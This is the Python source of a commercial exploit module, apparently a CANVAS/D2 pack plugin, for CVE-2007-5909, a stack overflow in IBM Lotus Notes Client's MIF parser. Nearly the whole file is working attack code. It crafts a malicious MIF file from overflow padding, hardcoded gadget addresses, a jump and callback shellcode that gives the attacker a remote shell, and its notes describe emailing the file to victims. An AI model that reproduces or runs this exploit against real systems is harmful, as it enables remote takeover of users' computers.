#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007
#


import sys

if '.' not in sys.path: 
		sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

import struct

# GUI info
NAME = "IBM Lotus Notes Client MIF Stack Overflow"

DESCRIPTION = "Stack Overflow Vulnerability in IBM Lotus Notes Client MIF file parser"
DOCUMENTATION = {}
DOCUMENTATION['Date public'] = "2007.10.23"
DOCUMENTATION['References'] = "http://www.zerodayinitiative.com/advisories/ZDI-07-059.html"
DOCUMENTATION['VersionsAffected'] = "IBM Lotus Notes Client <= 7.0.2"
DOCUMENTATION["CVE Name"] = "CVE-2007-5909"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5909"
DOCUMENTATION["Notes"]= """
The MIF file can be send by mail to a Lotus Notes Client. The target must open
the file with the option View and not Open to exploit the vulnerability.
"""

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['2000','XP'] 

targets = {
    0 : ['All Lotus Notes Client <= 7.0.2', 0],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)        
        self.clientversion = 1
        self.badstring = '\x00\x0d\x0a'        
        self.name = NAME         
        self.filename = "d:\\document.mif"
        return
    
    def makefile(self):
    	
        MIFfile = "<MIFFile 7.00> # Generated by FrameMaker 7.0p576"
        AAAA = "A" * 37
	
        nop = "\x90\x90\x90\x90"
        jmp = "\xeb\x64\x90\x90"	
				
        # ltouin22.dll (11/09/1998)        
        peb      = struct.pack("L", 0x7ffde101)
        add14    = struct.pack("L", 0x1821490f)	
        add10    = struct.pack("L", 0x182050cb)	
        add4     = struct.pack("L", 0x18223bf4)	
        dec      = struct.pack("L", 0x18223c23)
        mov      = struct.pack("L", 0x182038bc)		
        pop_eax  = struct.pack("L", 0x18202b17)	
        push_esp = struct.pack("L", 0x1820c6ea)	
        call_eax = struct.pack("L", 0x18207c06)	
					
				#[add esp,14][0x7ffdf101][nop][add esp,10][nop][add esp,4][jmp 0x64][pop eax][0x7ffdf101][push esp/pop esi]
				#[mov eax,esi][0xffffffff][dec eax x 16][call eax][nop][shellcode]
        filedata  = MIFfile + AAAA + add14 + peb + nop + add10 + (nop * 3) + add4 + jmp + pop_eax + peb + push_esp 				           
        filedata += mov + "\xff\xff\xff\xff" + (dec * 16) + call_eax + (nop * 5) + self.shellcode + nop
                				
        return filedata
        
    def makesploit(self,clientheader,clientbody):        
        self.createShellcode()        
        return 
        
    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        host = self.callback.ip
        port = self.callback.port
        return self.createWin32Shellcode(self.badstring, host, port)

    def getArgs(self):
        self.host     = self.target.interface
        self.filename = self.argsDict.get('filename', self.filename)        
        return 
        
    def displayVersions(self):
        for v in self.versions.keys():
            print 'Version %d: %s'%(v,self.versions[v][0])

    def run(self):
        self.getArgs()        
        filedata = self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd = file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

